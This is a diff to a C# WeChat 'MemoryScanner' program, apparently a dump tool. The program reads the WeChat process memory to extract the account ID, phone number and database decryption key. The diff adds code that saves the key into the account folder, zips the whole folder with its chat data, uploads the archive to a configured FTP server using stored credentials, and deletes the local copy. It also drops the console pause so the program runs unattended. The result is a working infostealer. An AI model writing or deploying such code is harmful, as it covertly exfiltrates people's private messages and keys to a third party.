@@ -1,10 +1,13 @@
-﻿using Microsoft.Win32;
+﻿using FolderCompressionUtility;
+using Microsoft.Win32;
 using System;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading.Tasks;
+using WeChat_Dump_Auto;
 
 class MemoryScanner
 {
@@ -161,7 +164,8 @@ class MemoryScanner
 
         return folderPath;
     }
-    public static void Main(string[] args)
+    static int Progress = 0;
+    public static async Task Main(string[] args)
     {
         string path = GetFolderPath();
         if (Directory.Exists(path))
@@ -179,7 +183,72 @@ class MemoryScanner
                 {
                     string folderName = Path.GetFileName(subdirectory); // 只获取文件夹名称
                     //Console.WriteLine($"找到文件夹: {folderName}");
-                    run(folderName, subdirectory + "\\config\\AccInfo.dat");
+                    byte[] UserNameBytes = GetWechatUserNameBytes(folderName, subdirectory + "\\config\\AccInfo.dat");
+                    string keytext = Run(UserNameBytes);
+                    if (keytext != "")
+                    {
+                        File.WriteAllText(Path.Combine(subdirectory, "Key.txt"), keytext);
+
+
+                        try
+                        {
+                            string zipfilename = GetTempZipPath();
+                            Console.WriteLine($"{zipfilename}");
+                            // 压缩文件夹，不包括根目录，压缩等级为5
+                            Console.WriteLine();
+                            Console.OutputEncoding = System.Text.Encoding.Unicode;
+
+                            Console.WriteLine("====================================================Zip==================================================");
+                            // 创建进度报告对象
+                            Progress<double> progres = new Progress<double>(progressa =>
+                            {
+                                int progress = (int)progressa;
+                                char finish = '█';
+                                char unfinished = '⑄';
+                                string flags = "-\\|/";
+                                int totalBlocks = 100;
+                                int filledBlocks = (progress * totalBlocks) / 100;
+
+                                string progressStr = new string(finish, filledBlocks).PadRight(totalBlocks, unfinished);
+                                string flag = progress == 100 ? "OK" : flags[(Progress % 4)].ToString();
+                                double roundedNumber = Math.Round(progressa, 3);
+                                string percent = progress == 100 ? "100%" : roundedNumber + "%";
+
+                                Console.Write($"\r[{flag}][{progressStr}][{percent}]");
+
+                                if (progress >= 100)
+                                {
+                                    Console.WriteLine(); // 完成时换行
+                                }
+                                Progress += 1;
+                            });
+
+                            try
+                            {
+                                await FolderCompressor.CompressFolderAsync(
+                                    subdirectory,
+                                    zipfilename,
+                                    compressionLevel: Config.compressionLevel,
+                                    includeBaseDirectory: true,
+                                    excludeFileStorageFiles: true,
+                                    progress: progres
+                                );
+
+                                Console.WriteLine($"压缩完成！ZIP文件位于: {zipfilename}");
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.WriteLine($"压缩过程中发生错误: {ex.Message}");
+                            }
+                            FTPHelper.UploadFileWithProgress(Config.ftpurl, zipfilename, Config.ftp_username,Config.ftp_password);
+                            File.Delete(zipfilename);
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"压缩失败: {ex.Message}");
+                        }
+                    }
+                    
                 }
             }
         }
@@ -187,38 +256,48 @@ class MemoryScanner
         {
             Console.WriteLine($"指定路径 '{path}' 不存在。");
         }
-
-        Console.ReadKey();
     }
 
-    static void run(string wxid, string filepath)
+
+
+
+    /// <summary>
+    /// 生成一个临时的ZIP文件路径。
+    /// </summary>
+    /// <returns>临时ZIP文件的完整路径。</returns>
+    public static string GetTempZipPath()
     {
-        byte[] UserNameBytes = GetWechatUserNameBytes(wxid, filepath);
+        string tempPath = Path.GetTempPath(); // 获取临时文件夹路径
+        string fileName = Path.GetRandomFileName(); // 生成随机文件名
+        string tempZipPath = Path.Combine(tempPath, $"{Path.GetFileNameWithoutExtension(fileName)}.zip"); // 组合成ZIP文件路径
+        return tempZipPath;
+    }
+    private static string Run(byte[] UserNameBytes)
+    {
+        string returnstring = "";
         //Console.WriteLine("UserNameBytes in hex: " + BitConverter.ToString(UserNameBytes));
 
         // 查找WeChat.exe进程
         Process process = Process.GetProcessesByName("WeChat").FirstOrDefault();
         if (process == null)
         {
-            Console.WriteLine("未找到WeChat进程");
-            return;
+            returnstring += "未找到WeChat进程\n";
+            return returnstring;
         }
 
         // 打开进程
         IntPtr processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, process.Id);
         if (processHandle == IntPtr.Zero)
         {
-            Console.WriteLine("无法打开进程");
-            return;
+            returnstring += "无法打开进程\n";
         }
 
         // 查找WeChatWin.dll模块
         ProcessModule weChatWinModule = process.Modules.Cast<ProcessModule>().FirstOrDefault(m => m.ModuleName == "WeChatWin.dll");
         if (weChatWinModule == null)
         {
-            Console.WriteLine("未找到WeChatWin.dll模块");
             CloseHandle(processHandle);
-            return;
+            returnstring += "未找到WeChatWin.dll模块\n";
         }
 
         IntPtr moduleBaseAddress = weChatWinModule.BaseAddress;
@@ -231,7 +310,7 @@ class MemoryScanner
             if (matchIndex != -1)
             {
                 IntPtr userNameAddress = moduleBaseAddress + matchIndex;
-                Console.WriteLine($"找到匹配字节，用户名地址: WeChatWin.dll+0x{matchIndex:X}");
+                returnstring += $"找到匹配字节，用户名地址: WeChatWin.dll+0x{matchIndex:X}\n";
 
                 // 根据已知的偏移量关系计算其他字段的地址
                 int weChatIDOffset = 1336; // 微信ID相对于用户名的偏移量
@@ -240,15 +319,15 @@ class MemoryScanner
 
                 // 获取微信ID地址
                 IntPtr weChatIDAddress = moduleBaseAddress + (matchIndex + weChatIDOffset);
-                Console.WriteLine($"微信ID地址: WeChatWin.dll+0x{(matchIndex + weChatIDOffset):X}");
+                //Console.WriteLine($"微信ID地址: WeChatWin.dll+0x{(matchIndex + weChatIDOffset):X}");
 
                 // 获取手机号地址
                 IntPtr phoneNumberAddress = moduleBaseAddress + (matchIndex + phoneNumberOffset);
-                Console.WriteLine($"手机号地址: WeChatWin.dll+0x{(matchIndex + phoneNumberOffset):X}");
+                //Console.WriteLine($"手机号地址: WeChatWin.dll+0x{(matchIndex + phoneNumberOffset):X}");
 
                 // 获取Key地址
                 IntPtr keyAddress = moduleBaseAddress + (matchIndex + keyOffset);
-                Console.WriteLine($"Key地址: WeChatWin.dll+0x{(matchIndex + keyOffset):X}");
+                //Console.WriteLine($"Key地址: WeChatWin.dll+0x{(matchIndex + keyOffset):X}");
 
                 // 读取微信ID
                 byte[] weChatIDBuffer = new byte[32];
@@ -256,11 +335,11 @@ class MemoryScanner
                 {
                     int nullIndex = Array.IndexOf(weChatIDBuffer, (byte)0);
                     string weChatID = System.Text.Encoding.UTF8.GetString(weChatIDBuffer, 0, nullIndex >= 0 ? nullIndex : weChatIDBuffer.Length);
-                    Console.WriteLine("微信ID (文本): " + weChatID);
+                    returnstring += "微信ID (文本): " + weChatID + "\n";
                 }
                 else
                 {
-                    Console.WriteLine("无法读取微信ID");
+                    returnstring += "无法读取微信ID";
                 }
 
                 // 读取手机号
@@ -269,23 +348,26 @@ class MemoryScanner
                 {
                     int nullIndex = Array.IndexOf(phoneNumberBuffer, (byte)0);
                     string phoneNumber = System.Text.Encoding.UTF8.GetString(phoneNumberBuffer, 0, nullIndex >= 0 ? nullIndex : phoneNumberBuffer.Length);
-                    Console.WriteLine("手机号 (文本): " + phoneNumber);
+                    returnstring += "手机号 (文本): " + phoneNumber+"\n";
                 }
                 else
                 {
-                    Console.WriteLine("无法读取手机号");
+                    returnstring += "无法读取手机号\n";
                 }
 
-
-                Console.WriteLine("Key (十六进制): " + GetHex(processHandle, keyAddress));
+                string key = GetHex(processHandle, keyAddress);
+                returnstring += "Key (十六进制): " + key+"\n";
+                return returnstring;
             }
             else
             {
-                Console.WriteLine("未找到匹配字节");
+                returnstring = "";
+                return returnstring;
             }
         }
 
         CloseHandle(processHandle);
+        return returnstring;
     }
     private static int FindPattern(byte[] buffer, byte[] pattern)
     {
